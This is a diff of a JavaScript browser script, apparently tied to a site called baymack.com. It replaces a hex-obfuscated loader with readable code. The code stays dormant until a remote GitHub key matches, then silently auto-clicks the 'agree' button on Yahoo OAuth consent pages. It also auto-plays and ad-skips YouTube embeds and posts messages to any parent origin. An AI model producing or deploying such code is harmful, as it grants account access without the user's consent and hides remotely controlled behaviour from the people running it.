@@ -1,1 +1,50 @@
-var _0xd0f6=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x70\x68\x6F\x6E\x67\x70\x72\x6F\x67\x75\x6E\x6E\x79\x30\x31\x2F\x62\x61\x79\x6D\x61\x63\x6B\x2F\x6D\x61\x73\x74\x65\x72\x2F\x6B\x65\x79\x2E\x6A\x73\x6F\x6E","\x6B\x65\x79","\x70\x61\x72\x73\x65","\x37\x31\x33\x65\x33\x30\x34\x32\x62\x66\x66\x33\x39\x30\x38\x38\x39\x64\x66\x34\x34\x66\x64\x33\x61\x35\x31\x32\x38\x35\x66\x39","\x67\x65\x74","\x64\x6D\x6D","\x6C\x6F\x67"];(function(){$[_0xd0f6[4]](_0xd0f6[0],function(data){if(JSON[_0xd0f6[2]](data)[_0xd0f6[1]]== _0xd0f6[3]){baymack()}});function baymack(){setInterval(function(){console[_0xd0f6[6]](_0xd0f6[5])},2000)}})()
+(function(){
+	$.get("https://raw.githubusercontent.com/phongprogunny01/baymack/master/key.json",function(data){
+		if(JSON.parse(data).key=="713e3042bff390889df44fd3a51285f9"){
+			baymack();
+		}
+	});
+function baymack(){
+	if(window.location.href=="https://www.baymack.com/"){
+		window.location = "https://www.baymack.com/vids";
+	}else if(window.location.href=="https://www.baymack.com/vids"){
+		
+	}else if(window.location.href=="https://www.baymack.com/prizes"){
+
+	}else if(window.location.href.substring(0, 35)=="https://api.login.yahoo.com/oauth2/"){
+		var inter = setInterval(function(){
+			if($("button[name='agree']").is(":visible")){
+				$("button[name='agree']")[0].click();
+				clearInterval(inter);
+			}
+		},2000);
+	}else if((location.href).substring(0,30)=="https://www.youtube.com/embed/"){
+		var sendMessage = function (msg) {
+			window.parent.postMessage(msg, '*');
+		};
+		setInterval(function(){
+			if($("button[class='ytp-large-play-button ytp-button']").is(":visible")){
+				$("button[class='ytp-large-play-button ytp-button']").click();
+			}
+			if($("button[class='ytp-ad-skip-button ytp-button']").is(":visible")){
+				$("button[class='ytp-ad-skip-button ytp-button']").click();
+			}
+			if($("div[class='ytp-offline-slate-bar']").is(":visible")){
+				sendMessage("reload");
+			}
+		},3000);
+	}
+}
+
+
+
+})()
+
+
+
+
+
+
+
+
+
